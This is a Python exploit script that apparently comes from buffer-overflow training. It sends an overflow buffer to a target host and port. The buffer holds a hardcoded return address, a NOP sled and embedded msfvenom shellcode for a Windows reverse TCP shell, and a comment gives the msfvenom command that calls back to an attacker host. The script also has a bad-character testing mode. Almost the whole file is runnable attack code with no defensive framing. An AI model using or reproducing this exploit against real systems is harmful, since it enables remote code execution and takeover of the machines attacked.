#!/usr/bin/env python3

import socket, time, sys
import argparse
from pwn import cyclic, cyclic_find


def put_in_eip(ip,port,prefix,overflow,eip,padding,buf,postfix):
    buffer = prefix + overflow + eip + padding + buf + postfix
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(buffer)
    try:
        s.connect((ip, port))
        print("Sending evil buffer...")
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("Done!")
    except:
        print("Could not connect.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Buffer Overflow, manually change 'eip' 'buf': eipcontroller.py --ip '127.0.0.1' --port 443 --prefix 'OVERFLOW2 ' --offset 1000 --nop 32"
        )
    parser.add_argument('--ip',
        type=str,
        dest='ip',
        help='Target IP')
    parser.add_argument('--port',
        type=int,
        dest='port',
        help='Target Port')
    parser.add_argument('--prefix',
        type=str,
        dest='prefix',
        default='',
        help='Prefix value to send before string')
    parser.add_argument('--size',
        type=int,
        dest='size',
        help='Payload size to send')
    parser.add_argument('--offset',
        type=int,
        dest='offset',
        help='Provide the offset value to use')
    parser.add_argument('--nop',
        type=int,
        dest='nop',
        default=16,
        help='Provide size of nop sled. default 16')
    parser.add_argument('-b', '--check-bad-chars',
        action="store_true",
        dest='check_bad_chars',
        help='Check for bad chars, using all HEX values, except /x00')

    args = parser.parse_args()

    ip = args.ip
    port = args.port
    prefix = args.prefix
    offset = args.offset
    overflow = "A" * offset

    # MUST MANUALLY PUT IN EIP, using arg parse won't work
    #eip = "BBBB"
    #C7 11 50 62
    eip = "\xC7\x11\x50\x62"

    padding = "\x90" * args.nop

    ## all_hex can be generated with
    # for x in range(1, 256):
    #      print("\\x" + "{:02x}".format(x), end='')
    all_hex = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

    # GENERATE PAYLOAD WITH MSFVENOM: only str not b''
    # msfvenom -a x86 -p windows/shell_reverse_tcp LHOST={{attacker}} LPORT={{443}} EXITFUNC=thread -b '\x00\' -f c 
    buf = ("\xda\xc7\xb8\x85\xdb\xbf\xfa\xd9\x74\x24\xf4\x5f\x33\xc9"
"\xb1\x52\x31\x47\x17\x83\xc7\x04\x03\xc2\xc8\x5d\x0f\x30"
"\x06\x23\xf0\xc8\xd7\x44\x78\x2d\xe6\x44\x1e\x26\x59\x75"
"\x54\x6a\x56\xfe\x38\x9e\xed\x72\x95\x91\x46\x38\xc3\x9c"
"\x57\x11\x37\xbf\xdb\x68\x64\x1f\xe5\xa2\x79\x5e\x22\xde"
"\x70\x32\xfb\x94\x27\xa2\x88\xe1\xfb\x49\xc2\xe4\x7b\xae"
"\x93\x07\xad\x61\xaf\x51\x6d\x80\x7c\xea\x24\x9a\x61\xd7"
"\xff\x11\x51\xa3\x01\xf3\xab\x4c\xad\x3a\x04\xbf\xaf\x7b"
"\xa3\x20\xda\x75\xd7\xdd\xdd\x42\xa5\x39\x6b\x50\x0d\xc9"
"\xcb\xbc\xaf\x1e\x8d\x37\xa3\xeb\xd9\x1f\xa0\xea\x0e\x14"
"\xdc\x67\xb1\xfa\x54\x33\x96\xde\x3d\xe7\xb7\x47\x98\x46"
"\xc7\x97\x43\x36\x6d\xdc\x6e\x23\x1c\xbf\xe6\x80\x2d\x3f"
"\xf7\x8e\x26\x4c\xc5\x11\x9d\xda\x65\xd9\x3b\x1d\x89\xf0"
"\xfc\xb1\x74\xfb\xfc\x98\xb2\xaf\xac\xb2\x13\xd0\x26\x42"
"\x9b\x05\xe8\x12\x33\xf6\x49\xc2\xf3\xa6\x21\x08\xfc\x99"
"\x52\x33\xd6\xb1\xf9\xce\xb1\xb7\xec\xdc\x19\xa0\x0c\xdc"
"\x98\x8b\x98\x3a\xf0\xfb\xcc\x95\x6d\x65\x55\x6d\x0f\x6a"
"\x43\x08\x0f\xe0\x60\xed\xde\x01\x0c\xfd\xb7\xe1\x5b\x5f"
"\x11\xfd\x71\xf7\xfd\x6c\x1e\x07\x8b\x8c\x89\x50\xdc\x63"
"\xc0\x34\xf0\xda\x7a\x2a\x09\xba\x45\xee\xd6\x7f\x4b\xef"
"\x9b\xc4\x6f\xff\x65\xc4\x2b\xab\x39\x93\xe5\x05\xfc\x4d"
"\x44\xff\x56\x21\x0e\x97\x2f\x09\x91\xe1\x2f\x44\x67\x0d"
"\x81\x31\x3e\x32\x2e\xd6\xb6\x4b\x52\x46\x38\x86\xd6\x66"
"\xdb\x02\x23\x0f\x42\xc7\x8e\x52\x75\x32\xcc\x6a\xf6\xb6"
"\xad\x88\xe6\xb3\xa8\xd5\xa0\x28\xc1\x46\x45\x4e\x76\x66"
"\x4c")

    if args.check_bad_chars:
       buf = all_hex

    postfix = ""
    #sys.exit()

    put_in_eip(ip,port,prefix,overflow,eip,padding,buf,postfix)
